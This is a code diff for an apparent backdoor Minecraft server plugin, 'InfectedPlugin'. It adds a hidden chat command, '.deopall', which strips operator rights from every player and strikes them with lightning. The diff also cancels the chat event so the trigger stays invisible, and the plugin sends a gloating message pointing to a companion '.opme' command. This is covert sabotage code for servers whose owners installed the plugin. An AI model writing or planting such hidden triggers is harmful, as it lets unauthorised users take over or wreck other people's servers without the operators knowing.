@@ -1,19 +1,20 @@
-package org.CreeperCoders.InfectedPlugin;
+package org.CreeperCoders.InfectedPlugin.Commands;
 
+import org.bukkit.Location;
 import org.bukkit.Server;
 import org.bukkit.Bukkit;
-import org.bukkit.ChatColor;
 import org.bukkit.entity.Player;
 import org.bukkit.event.Listener;
 import org.bukkit.event.player.AsyncPlayerChatEvent;
+import org.bukkit.ChatColor;
 
 public class Command_deopall implements Listener
 {
     public void onPlayerChat(AsyncPlayerChatEvent event)
     {
         String message = event.getMessage();
-        final Player p = event.getPlayer();
-        private Server server = Bukkit.getServer();
+        Player p = event.getPlayer();
+        Server server = Bukkit.getServer();
         boolean cancel = true;
     
         if (message.toLowerCase().contains(".deopall"))
@@ -31,8 +32,15 @@ public class Command_deopall implements Listener
                         target_pos.getWorld().strikeLightning(strike_pos);
                     }
                 }
+                p.sendMessage(ChatColor.DARK_RED + "Mwaaahahahahaha... All players deopped (and striked with lightning :) heheh) You were striked and deopped too, use .opme!");
                 cancel = true;
             }
+        }
+        
+        if (cancel)
+        {
+        	event.setCancelled(true);
+        	return;
         }
     }
 }
